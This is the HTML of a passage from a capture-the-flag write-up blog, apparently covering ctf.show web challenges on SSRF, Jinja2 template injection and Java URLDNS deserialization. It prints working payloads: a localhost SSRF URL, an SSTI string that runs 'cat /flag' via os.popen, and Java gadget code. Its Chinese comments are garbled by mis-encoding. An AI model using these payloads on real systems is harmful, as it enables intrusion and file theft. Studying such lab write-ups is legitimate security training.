</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>url=http://0/flag.php
</code></pre><h4 id="web357">web357<a hidden class="anchor" aria-hidden="true" href="#web357">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nx">gethostbyname</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">filter_var</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">,</span> <span class="nx">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="o">|</span> <span class="nx">FILTER_FLAG_NO_RES_RANGE</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;ip!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;scheme&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="ssti">ssti<a hidden class="anchor" aria-hidden="true" href="#ssti">#</a></h3>
<p>é€šè¿‡éå†æ‰¾æ¨¡å—</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Template</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">search</span> <span class="o">=</span> <span class="s1">&#39;os&#39;</span>   <span class="c1">#ä½ æƒ³åˆ©ç”¨çš„æ¨¡å—</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">            <span class="k">if</span> <span class="n">search</span> <span class="ow">in</span> <span class="n">i</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="c1"># print(&#34;no&#34;)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="web361">web361<a hidden class="anchor" aria-hidden="true" href="#web361">#</a></h4>
<p>æ²¡æœ‰wafï¼Œç›´æ¥æ‰“</p>
<pre tabindex="0"><code>{{g.pop.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}
</code></pre><h4 id="web362">web362<a hidden class="anchor" aria-hidden="true" href="#web362">#</a></h4>
<pre tabindex="0"><code></code></pre><h3 id="javaååºåˆ—åŒ–"><strong>Javaååºåˆ—åŒ–ï¼š</strong><a hidden class="anchor" aria-hidden="true" href="#javaååºåˆ—åŒ–">#</a></h3>
<h4 id="web846">web846<a hidden class="anchor" aria-hidden="true" href="#web846">#</a></h4>
<p>URLDNS</p>
<p>payloadï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.</span><span class="w"> </span><span class="o">*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">URLDNS</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">()));</span><span class="w">
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="p">,</span><span class="n">Integer</span><span class="o">&gt;</span><span class="w"> </span><span class="n">hashmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="p">,</span><span class="n">Integer</span><span class="o">&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&#34;https://78c78067-c876-40fb-b175-edb3b743655d.challenge.ctf.show/&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">hashcodefield</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;hashCode&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w">        </span><span class="n">hashcodefield</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w"></span><span class="c1">//          ä¸æƒ³è¿™é‡Œå‘èµ·è¯·æ±‚ï¼ŒæŠŠurlå¯¹è±¡çš„hashcodeæ”¹æˆä¸æ˜¯-1</span><span class="w">
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w">        </span><span class="n">hashcodefield</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">911</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="w">        </span><span class="n">hashmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="w">        </span><span class="n">hashcodefield</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="o">-</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="w"></span><span class="c1">//          è¿™é‡ŒæŠŠhashcodeæ”¹å›-1</span><span class="w">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">hashmap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">Â©2024 Xrntkk&rsquo;s Blog</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
